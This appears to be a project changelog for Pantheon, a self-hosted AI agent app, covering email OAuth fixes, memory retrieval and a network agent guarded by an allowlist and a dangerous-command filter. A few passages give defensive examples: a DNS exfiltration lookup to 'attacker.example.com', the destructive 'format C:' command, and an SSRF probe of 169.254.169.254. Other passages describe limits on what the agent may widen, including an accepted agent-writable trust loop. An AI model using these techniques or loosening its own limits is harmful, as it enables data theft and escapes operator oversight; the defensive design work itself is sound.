would let four new unresolved lookups take the slot in silence. The two `'#unified-intg-form,
#set-email-accounts-form'` fallbacks went too. And a test changed its mind: it had been pinning that
two body builders agreed about `smtp_port`, which is the state the old form was in *before* somebody
edited one; the live form has a single `_collectBody()` every path calls, so it now asserts the
structure that makes the defect unrepresentable.

### P18-07 — fifteen fields to zero, and the day I spent fixing a form nobody opens
`d432b75..HEAD`. **376 tracked, 181 done. 29 tests, 0 regressions. Suite 8,730 -> 8,744.**
The server already knew every answer — the callback fills ten fields, four of them module constants
— so the form was asking for values it pins and values it is about to be told. They collapse into
one block now, with the button above it rather than below fifteen rows. **Enabling that walked into
a defect the row did not name and that was already reachable**: the callback set `smtp_port = 587`
and never touched `smtp_security`, which defaults to `"ssl"`, so an account linked with no SMTP host
typed came out as **SSL on port 587** — a pair `_google_oauth_smtp_transport_allowed` rejects, and
one `smtplib.SMTP_SSL` answers by hanging to the socket timeout, which reads like a firewall.
**Then the real lesson.** `settings.js` holds two complete email-account forms, and `P18-01` plus
the first pass of this row were both written against the one that mounts nowhere:
`set-email-accounts-form` appears **zero times** in `index.html`, its initialiser early-returns, and
two other modules already listed it second behind the live one. Found by a test failing for the
wrong reason. Everything server-side was live throughout — the providers endpoint, the two-credential
guard that stops a full-mailbox consent being spent on a flow that cannot finish, `mail_auth`, the
origin resolver — but three browser halves reached nobody until now. **`check-wiring.py` had caught
it**: all four ids are in its unresolved list, inside the 124 the ratchet grandfathers. The ratchet
was working; nobody read the list. `B69` removes the dead form, and a new test pins the narrow rule
— whichever form carries account linking must render into an id that exists.

### P18-04 — the setting called app_public_url, and the one that was read
`261e58b..HEAD`. **376 tracked, 180 done. 19 tests, 13 mutations, 0 regressions. Suite 8,711 -> 8,730.**
There is a setting `app_public_url` and an environment variable `APP_PUBLIC_URL`, and they were
never connected — the panel has a field, `mcp_oauth` read the variable, and the two names are
indistinguishable when anybody says the problem out loud. The email OAuth path read neither and
built its redirect from the `Host` header, which behind a reverse proxy is wrong in the same
direction as `request.url.scheme`: uvicorn honours `X-Forwarded-Proto` only from a peer inside
`--forwarded-allow-ips`, so an HTTPS deployment produced an `http://` redirect and Google answered
`redirect_uri_mismatch`. **The hard part was not breaking what worked** — a direct-access deployment
works *because* of that header — so nothing was removed and three deliberate sources were added
above it, with a test pinning the request's place. Environment still outranks the setting, which
means the panel had to say when a typed value is being overridden, or the fix reproduces the defect
one layer down. The panel also prints the redirect URI now: every deployment must paste that exact
string into Google Cloud Console, and the only way to learn it used to be to run the flow and read
it out of the error.

### P18-02 + P18-03 — the account the agent could not send from
`127c9c0..HEAD`. **376 tracked, 179 done. 24 tests, 17 mutations (16 caught, 1 equivalent), 0 regressions. Suite 8,687 -> 8,711.**
*Can this account send mail* was written by hand three times. Two copies read
`host and user and (password or oauth_provider)`; the third read `host and user and password`, and
it is the one the agent's own email tools run — so a mailbox linked with the Connect button sent
mail from the web app, sent mail from notes, and reported **"has no SMTP configured"** to the agent.
Worse: `mcp_servers/email_server.py` never selected the four `oauth_*` columns, so a linked account
arrived there **looking like an account with a blank password** and failed as `AUTHENTICATIONFAILED`
— an error that reads like a wrong password and sends the operator to fix a credential that was
never wrong. Fixing it by hand would have made XOAUTH2 **six** spellings instead of four, so
`P18-03` landed in the same change: `src/mail_auth.py` is the single home, **in `src/` because
`routes/` and `mcp_servers/` both import from there and neither imports the other**. Transport
stayed with the callers on purpose. Two lessons arrived from tests rather than from reading — a
lookup table holding a function *object* freezes the binding at import, and a wrapper named for one
provider should **assert** that provider rather than read it, or a cfg that never carried the field
quietly stops refreshing. The one surviving mutation is proven equivalent and is recorded as such
rather than papered over with a test that cannot tell the difference.

### P18-01 — the button, the host, and the consent it was spending
`c502dae..HEAD`. **376 tracked, 177 done. 15 tests, 12 mutations, 0 regressions. Suite 8,671 -> 8,687.**
*Is this a Google mailbox* had two answers: a hostname comparison on the server, which is the copy
that runs when the link is used, and a marker on one of eight dropdown presets in the browser. They
disagreed — **Gmail** filled in `imap.gmail.com` and showed no button, **Google Workspace** filled in
the identical host and showed one. The fix removes an answer rather than adding one: the server
serves its host list and the browser asks. **The risk in the row was the password fields**, which the
old code hid whenever OAuth was available; qualifying Gmail under that rule would have deleted the
app-password path from the mailboxes most likely to use it, so OAuth is an offer and not a mode.
**The defect the row did not name is the one that mattered**: the button was live on every install
(`.env.example` ships both Google credentials commented out) and authorize checked only the client
id, while the callback needs the secret and posted an empty one. The default path was press Connect,
account saved, grant **full mailbox read-write**, come back to `invalid_client`. Checking one
variable meant failing after the only step a person cannot take back. A test slice that asserts the
browser holds no hostname of its own had to be taught that a `//` comment naming a host is not a rule
about hosts — the `ast`-not-regex distinction, third appearance.

### P19 — the proof ledger, and the correction to its own headline number
`fc254fc..HEAD`. **376 tracked, 176 done. 29 tests, 17 mutations, 0 regressions. Suite 8,642 -> 8,671.**
The owner asked for an evidence trail of every improvement over stock Odysseus, *"a proof ledger to
set us aside as a no shit better alternative"*, and cited memory retrieval going *"from 0.31 to
0.77"*. Both figures are real and they are **different metrics** — `0.319` is the lexical engine's
**MRR**, `0.77` is today's **recall@5** on the manager path. Stated as one ratio it is the first
thing a sceptic breaks. The defensible pairs on one corpus are **recall@5 `0.40` → `1.00`** and
**MRR `0.319` → `0.931`**, lexical to semantic: a better result than the one claimed, and one that
survives being checked. **The upstream turned out to be reachable**, so the comparison is a real
diff rather than a memory: `upstream/dev` is a remote on the deployment box, the fork point is
`b4d1293` (2026-08-20), and against it this tree is **156 commits, 1,964 files changed, 175,966
insertions, 537 files added and 4 removed**. That last figure is `Law 1` as a measurement, and
`P19-04` exists because a claim of *never subtract* with four counter-examples has to name all four.
**The ledger is generated and CI fails when the tree's copy disagrees**, because a hand-written
one is the second place every fact in this file already lives and it is the copy shown to
strangers. Five provenance tags, ordered by how much weight a row can carry, and **two rows
labelled `fixture`** — the ones a reader is most likely to quote and the ones least able to carry
it. Every claim names a command and the paths it depends on, and the checker asserts those paths
exist: **a claim cannot outlive its evidence**. It also refuses an `after` with no `before` — a
number with nothing to compare it to reads as an improvement and is not one. A mutation run found
**three rules I had asserted against the data and never against the checker**, so switching each
one off changed nothing and every test still passed; the same defect as a scan satisfied by a name
inside `if False:`, pointed at the wrong object. Writing the fourth of those tests turned up
something worse than expected: a claim in an undeclared area does not vanish, it **renders a
summary row with no section under it** — a headline promising detail that is not there, which a
reader cannot tell has happened. **The README had already rotted twice** (badge `6,301 passing`
against 8,642; `296 tracked, 77 done` against 376 / 170) and both figures are now pinned by the
checker. **The suite then found the same defect in my own test**: `test_tracker_total_drift_is_caught`
hard-coded `376 tracked tasks, 170 done`, which stopped being true six rows later in the same
sitting — the `.replace` matched nothing, the README stayed correct, the checker reported no
problem, and the test failed for the opposite of the reason it was written. A pinned figure inside
the test that pins figures. It derives them now. `P19-06` stays open: twelve upstream commits are
unmerged, five of them real fixes, and a fork that stops taking upstream's fixes is a snapshot.

### P17-11 — the container reaches the host, and P18 opens on a correction
`58d3453..HEAD`. **369 tracked, 170 done. 84 tests, 17 mutations, 0 regressions. Suite 8,559 -> 8,642.**
The owner asked for agents to reach *beyond* Docker's sandbox with a non-bypassable list of
*"super **nuclear level** dangerous commands"*. The premise was right and the containment is not a
bug: there are four ways past a container and three of them hand over the host, then try to claw
capability back with rules inside the thing being constrained. `P17-01` had already built the fourth
and shipped it with no writer; this adds the one writer. **Pantheon gains the ability to ask, not
the ability to widen what may be asked** — the 52-rule guard is compiled into the host process, on
the other side of an HTTP call, in a process Pantheon did not start and has no route to edit. Three
checks run and only the third is a boundary; the operator's editable lists narrow what is *sent*,
and the panel says so, because an operator who thinks they are the boundary under-protects the real
one. **Four of the 52 rules were dead on arrival**: `\b` asserts a word boundary and `-` and `/` are
not word characters, so `\bformat\b` never matched `format C: /fs:ntfs`. Four rules that read
correctly fired on nothing, which is worse than four absent rules because they were counted. The fix
was structural — every rule now carries an `example` and `test_every_rule_can_actually_fire` proves
all 52 trip. `D-2026-09-11-01` records the three design forks, the owner's three answers (all the
most permissive offered), and one **knowingly accepted** loop: `trust_rung` is agent-writable and
host execution now inherits it, which widens approval and never capability — written down rather
than silently closed, because closing it would answer a question the owner already answered.
**`P18` opened on a correction and that is the useful part**: Google email OAuth is not missing, it
is built, tested and live across `email_routes.py`, `email_helpers.py`, four `database.py` columns
and ten test files. What is missing is that almost nobody can reach it — one of eight providers
carries the `oauth: 'google'` marker, so choosing *Gmail* never shows the button — and that it
half-works once they do, because `mcp_servers/email_server.py` has no OAuth awareness at all. An
epic reading *"build OAuth account linking"* would have rebuilt a working thing, which is the
`P17-02` mistake one phase later.

### P17-04 — MAC is identity, IP is an attribute
`ad8fcf2..HEAD`. **361 tracked, 169 done. 28 tests, 18 mutations, 0 regressions. Suite 8,531 -> 8,559.**
A DHCP reshuffle changes every address and no device. Key the record by address and a lease renewal
reads as the old device vanishing and a new one arriving — the opposite of the question this exists
to answer. The test is the row: reshuffle three devices, get **one** new device and two moves. It
lives in `src/` rather than `netagent/`, because the agent observes and Pantheon remembers — which
keeps the agent restartable without losing anything. **The vendor table is the interesting half**:
*"from a vendored prefix table"* does not mean *ship 35,000 guessed rows*, because a table that is
wrong about a device the operator owns is worse than one that says *"I don't know"* — a wrong vendor
gets acted on, an absent one gets looked up. Every answer carries `provenance`, the seed is tiny,
and IEEE's own CSV is a deliberate import. **Running it deleted two seed entries** — Docker's and
QEMU's prefixes are locally administered, so `lookup` answers before the seed is consulted and
neither could ever have been returned. The first was found by running the lookup; the second by the
test written after the first, which is the argument for having written it. **Mutation testing hoisted
a value rather than deleting a branch** (`P13-14`'s move): `is_new`'s guard was provably doing
nothing because with a real epoch `now - 0` is fifty years, so the two answers now share one `age`,
and the test that pins it uses a 1970 timestamp with the reason written in.

### P17-03 — the ARP table, which on Windows meant the Win32 API
`038179e..HEAD`. **361 tracked, 168 done. 26 tests, 18 mutations, 0 regressions. Suite 8,505 -> 8,531.**
The owner's original ask, and the Windows path is what made it real work. `arp -a` is forbidden
twice over — this package has no shell, and on Windows it would mean parsing a localised,
format-unstable human table. `ctypes` is standard library, `GetIpNetTable` is the API `arp.exe`
itself calls, and it returns a struct rather than prose. **It is not a scan**: nothing is probed and
a quiet device does not appear, because turning a declaration into a sweep is how "look at my
network" becomes something an IDS reports. **The answer says what it withheld**, since a filtered
list that looks complete is worse than a short one. `/dns` is gated because a *forward* lookup is an
outbound channel — resolving `<secret>.attacker.example.com` puts the secret in somebody's DNS logs
without a packet reaching the target. **Three of this row's defects were in its own tests and all
three are the same shape**: a shell-smell scan that read a docstring saying the word it forbids
(`Law 20`, fifth time), a sort test that called the key function instead of the sort
(ingredient-not-recipe, fourth time), and two route-population pins in two files, one of which went
stale while the other kept passing (`Law 13` in miniature). **And the owner's real table found the
fourth**: 36 entries, 10 in range, one of them `192.168.1.255 / ff:ff:ff:ff:ff:ff` — a genuine ARP
entry and not a device. Rows are labelled rather than dropped, because the ask was to *organise*.
Three more mutations survived that, all one fixture mistake — the broadcast case used the `.255`
address *and* the broadcast MAC, so deleting either check left the other answering. **A fixture where
two signals agree cannot tell you which one fired.** mDNS/SSDP and DHCP leases are split to `P17-10`
rather than claimed: multicast *sends*, which is the scan this row avoided, and leases are the
router's, which is an integration rather than an observation.

### P17-02 — the bound lives on the agent, because Pantheon is the gated party
`1c8dbb7..HEAD`. **360 tracked, 167 done. 28 tests, 15 mutations, 0 regressions. Suite 8,477 -> 8,505.**
The row said *"a gate the gated party can widen is not a gate"*. Following that sentence to its end
moves the allowlist out of Pantheon's settings entirely: **Pantheon is the gated party**, so the list
is arguments to the process the operator started, on the machine they started it on. A Pantheon
talked into anything still cannot widen it, because the widening move does not exist on its side of
the wire. Not a second `src/networks.py` — that one **directs** (Pantheon's own scoping, narrowable
by the thing it governs) and this one **bounds** (set outside, and not). **Empty refuses everything**,
which is the shipped state: `10.0.0.0/8` is refused *because it was never named*, and a list that
starts open has no such answer. The gate is the only door — the dispatcher decides a route needs a
target by table membership, so a target route that skipped the check is not a shape the file has.
`/reach` lands with it rather than after it, because a dead gate is not evidence. **Mutation testing
changed the code twice**: a guard that could not change an answer was deleted rather than tested
around (fourth time this phase), and `?target=` was concatenated rather than encoded. **And one of
this row's own tests was deliberately weakened, with the reason written into it** — it asserted
`call()` took one parameter, `P17-02` added `target`, and it fired. The property that mattered was
never *no parameter exists*, it is *no parameter changes the destination*.

### P17-01 — the process that actually has the LAN
`b0d4d78..HEAD`. **360 tracked, 166 done. 53 tests, 22 mutations, 0 regressions. Suite 8,424 -> 8,477.**
`netagent/` is three modules and a README, standard library only, importing nothing from the
application — two tests walk the imports and enforce it. A host is not a place to install SQLAlchemy
so a laptop can list its own interfaces, and **its size is the security model**: this process has the
LAN. The credential is `companion/pairing.py` with the roles swapped — the agent is the verifier, so
it stores the hash and Pantheon holds the raw. **It is SHA-256 rather than bcrypt and that is argued
in the file**, because it is the first place the no-dependencies rule costs something: a KDF makes
guessing a *low-entropy* secret expensive, and this token is 256 machine-generated bits. The compare
is still constant-time. **The clause that needed proving is the third — the container still cannot
reach the LAN — and it is structural rather than a promise. *(2026-10-01, `B975`: the container now reaches the LAN on Docker Desktop 29.7.2; the structural half — no parameter an address can arrive through — is what holds.)*** `call(route)` takes a route name from a
frozenset in the file and the base from an operator setting; there is no parameter an address can
arrive through, so *"fetch 169.254.169.254 through the network agent"* has nowhere to put it. A test
reads the signature and fails if a `url=` appears. **Two bugs the work found on itself**: `socket()`
raises at *construction* for an unavailable family, not at connect — caught by running it in the very
container it exists to differ from — and the settings route would have stored an unparseable agent
address exactly the way `P17-09` found it storing an unparseable CIDR. The launcher is deliberately
not a service installer: a background service is easy to install and hard to remember you installed.

### P17-09 — the allowlist finally has a front door
`fbbf7c6..HEAD`. **360 tracked, 165 done. 27 tests, 15 mutations, 0 regressions. Suite 8,397 -> 8,424.**
`src/networks.py` has been enforcing since `P16-16` — consulted inside `check_outbound_url` and
`outbound_fetch` *before DNS* — and `grep networks` returned nothing in `static/js/` and nothing in
`routes/`. The only way to declare one was a hand-built JSON body or editing `settings.json`, and a
malformed CIDR was accepted with a 200, logged to a file nobody watches, and dropped. **An allowlist
the operator has no supported way to write is not operator-set**, which is the premise `P17-02` is
named after. Now a `Networks` tab, a validator that runs **only at the write boundary** (the loader
stays lenient — a file that loaded yesterday has to load today), and one endpoint answering both of
the panel's questions in Python, because a CIDR matcher in JavaScript would be the same rule in two
languages and `B65` is the standing proof of what that costs. **Both first-pass mutation survivors
were my own tests being loose** — a text window that reached the next validation block's `raise`,
and a name-scan that a dead `if False:` branch satisfied. Proximity is not reachability, and both
tests now locate the branch by its test expression.

### B68 and the allowlist that was already there
`366eeb2..HEAD`. **360 tracked, 164 done. 9 tests, 6 mutations, 0 regressions. Suite 8,388 -> 8,397.**
`P17-02` asked for a CIDR allowlist. **`src/networks.py` has been one since `P16-16`** — named
segments, `scoped_to()`, `host_allowed()`, already consulted inside the SSRF validators *before DNS*.
Building the row as written would have produced the second form `Law 14` exists to prevent, so the
row is corrected to a quarter of its size rather than done. **Checking it measured two wrong
hypotheses in a row.** The agent cannot widen the allowlist with `set` — structured settings are
refused from chat. Emptying it does not open a scope — `networks` fails **closed**, and a run scoped
to a name that no longer exists refuses every host including the operator's own. What the check found
instead is `B68`: the `set` refusal offered `reset` as the alternative, and for eight of the nine
structured settings — every one that ships empty — `reset` deletes what the operator wrote. The
refusal was advertising a worse door than the one it closed. Filed as **durability, not escalation**,
because filing it as a security hole is how the next person checks the claim, finds it false, and
deletes the guard with it. **And the row's own premise does not hold**: `networks` has no panel, no
route and no validation, so the allowlist `P17-02` calls operator-set is one the operator has no
supported way to set. `P17-09`.

### P17-07 — the thing that notices the agent giving up had never run
`a522999..HEAD`. **359 tracked, 164 done. 19 tests, 15 mutations, 0 regressions. Suite 8,369 -> 8,388.**
The row said the classification was computed and thrown away. It was worse: `evaluate_turn_regex`'s
two callers are `maybe_escalate`, which has **zero callers**, and `run_teacher_inline`, which returns
at its first gate unless a teacher is configured — both default off. **Detection is not escalation.**
Escalation needs a teacher; noticing needs a regex, and it is the only evidence `P17-08` can be built
from. **Getting the privacy right took a test with a real payload in it.** The first attempt stored
`evaluate_turn_regex`'s reason string, and that reason *embeds conversation* — two of its three
shapes interpolate the tool's own error text with `!r`. What ships is an allowlist, not a sanitiser:
the extracted token is compared against the patterns this module declares, so a tool whose error
reads *"Failed to compile pattern 'CUSTOMER-SSN-…'"* cannot smuggle it into a 90-day-pruned table
that rides diagnostic bundles. **Six refusals returned above `_t0`** and left no row at all while
every refusal below it left one — one `_refused` helper for all six, and a structural test that every
refusal return in that function goes through it. The events column can now tell *refused* from *ran
and broke*. **The last mutation to survive was the call site, for the third time in this project** —
`B61`'s pill, `P13-15`'s pill, and now a detector nothing invoked, which is the exact state this row
found `evaluate_turn_regex` in. It has a test.

### P17-06's rule, and the third time a tool name went unregistered
`efb96e5..HEAD`. **359 tracked, 163 done. 11 tests, 8 mutations, 0 regressions. Suite 8,358 -> 8,369.**
`P17-06` asked which of native-tool or MCP-server a new capability should be. Counting the surface
before answering found three defects and a better question. **The rule as asked does predict** — own
process when it carries a dependency set, a connection or a blast radius; native otherwise — and it
gets three of four right, with `image_gen` (185 lines, one `httpx` call) genuinely misplaced and
`manage_memory` *already* native while its server runs as a shadow (`B67`). The stated rationale in
`builtin_mcp.py`, that each server carries *"hundreds of LOC of unique logic"*, does not survive
`wc -l`: 2913, 286, 243, 185, and all four import from `src/` anyway. **But placement has never
broken anything here — registration has, four times.** A tool name needs up to nine registrations
and a miss in any one fails silently and *differently*. `B66` is the fourth and the worst: the system
prompt names `manage_rag` twice as the place to offload large tool results, the name was in no tag
set, `parse_tool_blocks` gates on that set — so no `ToolBlock` was built, **not even the "Unknown
tool" branch ran**, and `strip_tool_blocks` left the raw fence visible in the reply under a sentence
saying the data was stored. So the rule is `check-tool-surface.py`, CI's fifteenth checker, and not a
paragraph — a paragraph is what was missing all four times, and the fourth (`api_call`, absent from
the ninth register) turned up mid-work. **The row stays open on its second
clause**: the gap analysis has to come from real traffic, and this tree holds 0 sessions and 1
`events` row, while the one signal that would answer it — `teacher_escalation`'s give-up classifier —
is computed and thrown away. `P17-07` wires it; `P17-08` runs it.

### P3-24 — the scanner had a whole-file blindfold, and it was hiding real bugs
`43e4c42..HEAD`. **357 tracked, 163 done. 3 tests, 10 mutations, 0 regressions. Suite 8,356 -> 8,358.**
`B65` handed this row nine names. Removing one line from the scanner made it seventeen. That
line skipped any file containing the string `toolWindowZOrder` — *this file already reads the
live stack somewhere* — which is a whole-file exemption, and a whole-file exemption is a
whole-file blindfold. `sessions.js` reads the stack on the **mobile long-press** path and not
on the desktop one that nearly everybody uses; the scan called it clean. **The fix for a scan
that cannot follow a variable is not a narrower skip list, it is teaching it the other spelling**
— `notes-pane-backdrop` was setting its z through `setProperty('z-index', …, 'important')` the
whole time, and one regex retired that exemption honestly instead of by fiat. Eight sites
converted, one exempted with a reason (`theme-zone-highlight` decorates *page* elements and
skips `#theme-modal` deliberately), and the ratchet deleted rather than emptied: a one-entry
ratchet is a place to hide the tenth. The session folder submenu needed `topPortalZ() + 1`,
because `topPortalZ()` does not count portaled dropdowns — it and its parent menu would tie,
and the submenu, appended first, would lose on DOM order and open behind the menu it flew out
of. A test asserts the append order that `+ 1` depends on.

### B65 fixed, P17-05 decided — the layer was chosen badly, and the rule read one language
`15bc05c..HEAD`. **357 tracked, 162 done. 5 tests, 5 mutations, 0 regressions. Suite 8,350 -> 8,356.**
*"The user decides how 'powerful' the LLM agent is."* So network configuration is in scope, and the
boundary is not read-versus-write — it is **who set the ceiling**. That is `setting_is_explicit` on
its fifth application, and at five it stops being a pattern and becomes this project's authority
model: a thing a person typed beats a thing the system inferred, and the agent moves inside the
ceiling but never raises it. Each capability gets its own switch rather than one god-flag, all of
them in `_SELF_RESTRAINT_KEYS`, with `P17-02`'s CIDR bound applying independently. The one thing
the answer does not license is a change with no way back: *"the user decides"* stops meaning
anything the moment the user cannot reach the surface where deciding happens. **`B65` is fixed and the diagnosis was the owner's**: *be smart about how layers are chosen.* `ui.js` promotes every visible `.modal` with an `!important` z from a counter that only climbs, and `#styled-confirm-overlay` is a `.modal` pinned at 99999 — so the first styled confirm of a session latches that counter to 100000 and every modal afterwards outranks the picker's literal 10000, permanently. That is `#4720` recurring on a surface never converted to `topPortalZ()`. **The more useful half is why the rule missed it**: the test that forbids exactly this reads JavaScript, and `.cp-popover` pins its z in `style.css`. A rule that reads one language cannot see a defect living in the other. The scanner reads both now and found nine more on its first run — listed as a ratchet for `P3-24` rather than fixed blind, because converting surfaces this session cannot exercise is how a deployment breaks quietly.

### P13-21, the release gate, and the network the agent cannot reach
`7dbe54a..HEAD`. **356 tracked, 161 done. 60 tests, 18 mutations, 0 regressions. Suite 8,312 -> 8,350.**
ChromaDB is still tried first and still wins when it answers (`Law 1`); what changes is where an
unreachable service lands. It used to be keyword matching; it is now semantic search, because the
embedding model was never the service — only the index was, and for a personal Brain an index is a
matrix multiply. Proved with `CHROMADB_PORT=1`: *can I eat prawns* → allergic to shellfish, *what
do I drive* → the diesel van, *who am i* → the name, all three unrankable lexically, all three
through the product's own store with nothing running. **`B64` closes with it** — the two
deployments this rescues are the ones nobody was watching: the native Windows launcher mentions
chroma zero times, and the macOS one force-installs a heavier package to dodge a failure mode
`chroma_client.py` cannot have. Docker, the maintainer's own deployment, is the one that already
worked, which is exactly why the gap stayed invisible. **Two silent bugs surfaced before mutation
testing began**: the reload check counted dict keys instead of rows and discarded the index on
every restart, and every write leaked a temp file. And one mutation survived twice because the
fixtures were doing the code's work — unit vectors, then orthogonal ones, neither of which lets
magnitude flip an order.
**`P10-09` closed on the real deployment** — all six touched static assets byte-identical between
host tree and running container, which is the check that row exists for, since `static/` has no
bind mount. **`P10-10`'s automated half is a script now**: `release-gate.py` reads its checker list
out of `ci.yml` rather than copying it, and found on its first run that `check-tracker.py` had
existed for weeks with CI never running it — so a roadmap that lies about its own arithmetic has
been pushable this whole time. **`P17` opened**: measured from inside the container, `1.1.1.1:53`
is reachable and `192.168.1.1:80` times out. The agent has more reach to the public internet than
to the network it is hosted on, and the ARP case is topology rather than permissions — a bridged
container's neighbour table is the bridge's and no flag changes that.

### Rebuilt and redeployed — and P0-08 closed on the Docker it had been waiting for
`2d2b82f..HEAD`. **350 tracked, 159 done. 7 tests, 0 regressions. Suite 8,305 -> 8,312.**
Everything since `71a5616` is now actually running: image rebuilt (exit 0, 2.87GB, replacing one
thirteen days old), stack recreated, `/api/health` green, `/` → `/login`, `/api/status` 401.
Verified **inside the running container** rather than inferred — `stem('drives') → 'drive'`, and
*"what do I drive"* returns the diesel-van memory, which is the exact probe `B62` was filed on.
ChromaDB answers its heartbeat, so this deployment gets semantic retrieval and will show
*semantic* rather than *keyword only* on the memory pill. **`P0-08` closed**, and re-deriving it
first was the right call: the `ODY_USER` rename it described had already been swept by a later run
and nothing updated the row. What was genuinely outstanding was proof on a machine with Docker —
searxng force-recreated, reached healthy, answered a JSON search 200; and `pantheon` declaring
`depends_on: service_healthy` means the app starting at all *is* that healthcheck passing.
**`B63` found and fixed on the way**: one compose variable of sixty had no default, warning on
every command. Behaviour was already safe — but only because a `try/except ValueError` nobody
would recognise as load-bearing was catching `int("")`. That guard is now pinned by a test.

### P13-16's premise corrected, and P13-21 filed — the service the Brain does not need
`73231c7..HEAD`. **350 tracked, 158 done. 3 tests, 0 regressions. Suite 8,302 -> 8,305.** Measurement, not code.
`P13-16` says *recall wide, then select*, which assumes the misses are ranked low. They are
filtered out entirely: lexical recall is flat at 0.77 from k=5 to the whole corpus, so a wider
stage one hands stage two nothing, and there is nothing to widen *to* — `can I eat prawns` does
not score badly against `allergic to shellfish`, it does not score. **The ceiling, measured with
`fastembed` in process and no ChromaDB: recall@5 1.00, MRR 0.931, thirty of thirty**, every probe
no lexical scorer could reach. So stage two's job is precision and the reason, not recall — at
k=5 semantic precision is **0.20**, meaning four of five memories injected each turn are noise —
and a score-gap cutoff (median gap 0.096) is a much cheaper candidate that has to be measured
against the model call before the model call is justified. **`P13-21` is the larger finding**:
the embedding model is already local and zero-config, only the *index* is a separate process, and
brute-force cosine is 0.82ms at ten thousand memories. A personal Brain never reaches the scale
that justifies the service, and the service being down is the entire reason `B61` exists. The
prize is not speed, it is deleting a failure mode.

### P13-15 — the moment a fact was confirmed was the moment it was discarded
`29bfa15..HEAD`. **349 tracked, 158 done. 42 tests, 26 mutations, 0 regressions. Suite 8,260 -> 8,302.**
Not that nothing counted repetition — that all three dedupe paths located the matching memory
precisely and then `continue`d. `_is_text_duplicate` always knew *which* memory a new fact
restated and threw the answer away on its return statement, and nobody noticed because every
caller was about to skip anyway. `mentions` now sits beside `uses` and never merges with it:
`uses` counts how often the system reached for a fact, `mentions` how often the person said it,
and `mention_sessions` — distinct conversations — is the durability signal, because extraction
runs after every response and one chatty session is not eleven pieces of evidence. Legacy
memories read zero rather than one, since the store cannot know what was said before anyone was
counting. The retrieval prior **shares** recency's five percent through `max()` instead of taking
its own, so the relevance terms keep exactly the weight they had and no existing memory is
quietly re-ranked. Two pills in the Brain, from two fields, each title naming what the other one
is not. Mutation testing again deleted a branch rather than testing around it — `sessions <= 1`
was dead because `log(1)` is already zero — and again forced an extraction so the pill is data a
test can run instead of DOM a test can only read.

### B62 — stemming, and the end of the lexical road
`be5803e..HEAD`. **349 tracked, 157 done** (bug rows sit outside the phase tally). **25 tests, 20 mutations, 0 regressions. Suite 8,176 -> 8,260.**
`P13-13`'s golden set found this on its first run and this is it closed: neither engine reduced a
word to its stem, so *what do I drive* returned nothing for "User **drives** a diesel van" — a probe
written as an easy control. **recall@5 0.63 → 0.77, MRR 0.633 → 0.767**, four more probes of thirty,
the largest single retrieval gain of the phase. `Law 16` chose the implementation: Porter written
out rather than `nltk` depended on, because that one downloads corpora and this one is rules with
nothing behind them — the module imports `__future__` and a test says so. **The row's second miss is
still a miss, on purpose and now pinned**: `drive`/`drives` is inflection, `allergies`/`allergic` is
derivation, and collapsing derivations means over-stemming. Which makes it a semantic miss wearing a
lexical costume — and a test now asserts that **every** surviving miss shares no token with its
answer, so the lexical road is finished and `P13-16` is what is left. **Seven stemmer rules survived
mutation** because nothing in the suite could tell them apart; the discriminating words were searched
for programmatically rather than guessed, because a rule nothing distinguishes deletes for free.

### P13-17..20 filed — the assistant learns how you talk, and changes register rather than mood
`35a13d9..HEAD`. **349 tracked, 157 done. Rows and a decision, no code yet.**
The owner's direction, in their words: a profile built from *"the way the user types"* and *"shifts
in emotion by the amount of swears or laughing, which ties into humor"*, so the product *"does more
than thinks and replies"*. **The seed already ships in the narrowest form it could take** —
`_is_casual_low_signal` reads how a message is written and changes what the model receives; one
regex, one bit, one effect — so this is the general case of a mechanism the codebase already trusts
rather than a new subsystem. Three layers that must not be conflated: **style** (slow, a profile),
**state** (volatile, expires — a reading that persists becomes a belief), and **register** (the
output). **The baseline is personal, never population**, and that is the call the whole thing stands
on: a swear count is not an emotion signal, a swear count against this person's own norm is, and the
owner's own *"PRESS!!"* would read as elevated to any population model and be wrong every time.
**Register, not mood** — answering impatience with sympathy answers it with more words, which is
backwards; the useful move is shorter, fix first, stop asking. **Humour does nothing until it is
learned**, because joking to defuse, joking when relaxed and joking to soften a complaint are one
observable with three opposite meanings. An explicit persona always beats a reading
(`setting_is_explicit`, fourth application). And the line, recorded once: the profile keeps *how to
be useful to this person*, never *how this person is doing*.

### P13-14 — one memory scorer, and four behaviours rescued from the one that went
`ed58f59..35a13d9`. **345 tracked, 157 done. 31 tests, 15 mutations, 0 regressions. Suite 8,140 -> 8,176.**
Two scorers, and the better one served the fewer surfaces: BM25-with-corpus-IDF fed the chat
preface and nothing else, while Jaccard-plus-four-keyword-lists fed the Brain panel, the memory
provider, `ai_interaction` and the agent's own MCP `memory_search`. `src/memory_retrieval.py` is
the only one now; both old entry points are bindings to it and kept their names, because five call
sites and their doubles use them. The extraction was proved faithful before anything was deleted —
`_hybrid_retrieve` delegated first and the golden set returned 0.63/0.633 unchanged. **Most of the
work was finding what would have been lost quietly**: an exact-phrase rule no IDF weighting
reproduces, a task boost the surviving scorer never had, and contact and preference tests gated on
a stored category that extraction almost never assigns — so those two boosts fired for nobody, the
same defect as four dead keyword lists reached from the other side. A test then found a fifth: the
exact-phrase rule did not apply on the empty-query path, so it was unconditional everywhere except
where it was the only thing that could match. The debug endpoint reports the intent that actually
ranks rather than a classifier that no longer drives anything — a diagnostic that agrees with the
truth by coincidence is worse than none, because it is believed. **And the full suite found what the golden set could not**: BM25's IDF collapses on a small corpus, so a person's first week — one or two memories — got nothing back at all. Floored at ten documents, which leaves every realistic corpus byte-identical. A measurement harness has a shape, and its shape is a blind spot.

### P13-11 decided — B61 and the golden set, so "better" stops being an adjective
`c1936835..HEAD`. **345 tracked, 156 done. 48 tests, 33 mutations, 0 regressions. Suite 8,092 -> 8,140.**
Five options went to the owner on how to build the Brain; three came back, in order: honest
reporting, a golden set, one retrieval path — then cross-session frequency, then two-stage
retrieval where a model does the selecting. Not a fine-tune: the instinct that the representation
should be model-made rather than word-overlap is right and already half-shipped as `fastembed`,
but a fine-tune cannot be edited, deleted, cited, or told from a hallucination, and training is
parked. **`B61`** — semantic search runs against a ChromaDB *service* that can go down long after
a working install, and every layer above reported that fallback as though the vector store had
answered: a variable literally named `vector_results` holding a lexical result, a `score=None`
indistinguishable from a vector hit that scored nothing, and a docstring calling a
`requirements.txt` dependency optional. One vocabulary module that imports nothing, an
out-parameter report written before every early return, a per-memory label because a hybrid run
finds some by index and some by wording, and it rides the pill `P13-10` already built.
**`P13-13`** — the first number in this tree that can tell one retrieval engine from another.
